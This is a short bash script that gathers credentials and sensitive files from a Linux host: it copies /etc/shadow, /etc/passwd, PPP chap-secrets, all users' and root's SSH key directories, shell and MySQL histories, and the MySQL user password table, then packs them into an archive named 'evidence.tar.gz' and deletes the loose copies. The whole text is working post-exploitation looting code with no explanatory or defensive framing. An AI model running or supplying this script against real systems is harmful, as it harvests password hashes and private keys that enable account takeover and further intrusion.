#! /bin/bash

# Basic
id > id.txt
ifconfig > ifconfig.txt

# Config
cat /etc/passwd > etc_passwd.txt
cat /etc/shadow > etc_shadow.txt
cat /etc/*.pass > etc_any.pass.txt
cat /etc/ppp/chap-secrets > etc_chap-secrets.txt
cat /etc/hosts  > etc_hosts.txt

# User
cat /home/*/.ssh/* > home_ssh.txt
cat /home/*/.bash_history > home_bash_history.txt
cat /home/*/.mysql_history > home_mysql_history.txt

# Root
cat /root/.ssh/* > root_ssh.txt
cat /root/.bash_history > root_bash_history.txt
cat /root/.mysql_history > root_mysql_history.txt

# Mysql
cat /var/lib/mysql/mysql/user.MYD > mysql_user_MYD.txt

# Package
tar --remove-files  -zcvf evidence.tar.gz *.txt
